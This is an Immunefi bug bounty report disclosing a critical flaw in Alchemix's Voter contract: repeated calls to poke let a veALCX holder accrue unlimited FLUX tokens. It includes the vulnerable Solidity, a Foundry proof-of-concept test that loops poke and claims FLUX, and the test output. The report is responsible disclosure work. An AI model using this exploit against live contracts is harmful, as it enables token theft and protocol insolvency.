# 31461 - \[SC - Critical] veALCX holder can mint Unlimited FLUX tokens

Submitted on May 19th 2024 at 21:51:12 UTC by @OxAnmol for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31461

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

`Voter:poke` function can be called multiple times by the veALCX holder and mint unlimited flux.

## Vulnerability Details

The `Voter:poke` function is used to vote again with the same weights, effectively renewing the previous vote.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195C3-L212C6>

```solidity
    function poke(uint256 _tokenId) public {
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }
```

It internally calls \_vote functions which is responsible for voting by looping though the provided gauge addresses and it also accrues the flux token for voters by calling Flux:accrueFlux.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412C4-L455C6>

```solidity
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
       ...SNIP...
       //@audit if we call from poke the we can accrue unlimited FLUX
        IFluxToken(FLUX).accrueFlux(_tokenId);
        uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);

        for (uint256 i = 0; i < _poolCnt; i++) {
            address _pool = _poolVote[i];
            address _gauge = gauges[_pool];

            require(isAlive[_gauge], "cannot vote for dead gauge");

            uint256 _poolWeight = (_weights[i] * totalPower) / _totalVoteWeight;
            require(votes[_tokenId][_pool] == 0, "already voted for pool");
            require(_poolWeight != 0, "cannot vote with zero weight");
            _updateFor(_gauge);

            poolVote[_tokenId].push(_pool);

            weights[_pool] += _poolWeight;
            votes[_tokenId][_pool] += _poolWeight;
            IBribe(bribes[_gauge]).deposit(uint256(_poolWeight), _tokenId);
            _totalWeight += _poolWeight;
            emit Voted(msg.sender, _pool, _tokenId, _poolWeight);
        }

        if (_totalWeight > 0) IVotingEscrow(veALCX).voting(_tokenId);
        totalWeight += uint256(_totalWeight);
        usedWeights[_tokenId] = uint256(_totalWeight);
        lastVoted[_tokenId] = block.timestamp;

        // Update flux balance of token if boost was used
        if (_boost > 0) {
            IFluxToken(FLUX).updateFlux(_tokenId, _boost);
        }
    }
```

If a user has locked their BPT but has never voted, they can call the `poke` function. This function attempts to renew the user's voting, but because the user never voted in the first place there is nothing to renew, it only accrues the flux for the user. The user can call this `poke` function as often as they want to accumulate unlimited flux.

## Impact Details

Users can mint an unlimited amount of FLUX, which could potentially devalue the currency and undermine the logic for boosting and early unlocks.

The FLUX token is a vital component of the system and is expected to hold some tangible value in the open market. Unlimited minting could potentially disrupt its tokenomics and make the protocol's DAO insolvent.

Imagine if such an attack occurs one year after the protocol launch. Users holding millions of dollars worth of FLUX could lose everything due to a price surge.

Based on above stated reason I believe this to be a critical issue.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195C3-L212C6>

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L188C3-L192C6>

## Proof of Concept

Here is a simple test to show how veALCX holder can call `Voter::poke` many times and accrue unlimited flux.

paste the test in `FluxTokenTest.t.sol` and run it.

```solidity
function testMintUnlimitedFLux() external {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, veALCX.MAXTIME(), true);
        //Within the same epoch call poke function as many times as you want to earn unlimited flux
        hevm.startPrank(admin);
        // For example for are doing only 100 iterations
        for (uint256 i = 0; i < 100; i++) {
            voter.poke(tokenId);
        }
        uint256 claimableFluxAfterPoke = flux.getUnclaimedFlux(tokenId);
        flux.claimFlux(tokenId, claimableFluxAfterPoke);
        console2.log("Flux Stolen: ", flux.balanceOf(admin));
        vm.stopPrank();
    }
```

## Output

Here you can see `98.839805301052500300` FLUX is stolen just by calling the `poke` function 100 times.

```bash
Ran 1 test for src/test/FluxToken.t.sol:FluxTokenTest
[PASS] testMintUnlimitedFLux() (gas: 2867107)
Logs:
  Flux Stolen:  98839805301052500300

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 93.06s (65.30s CPU time)

Ran 1 test suite in 93.95s (93.06s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```
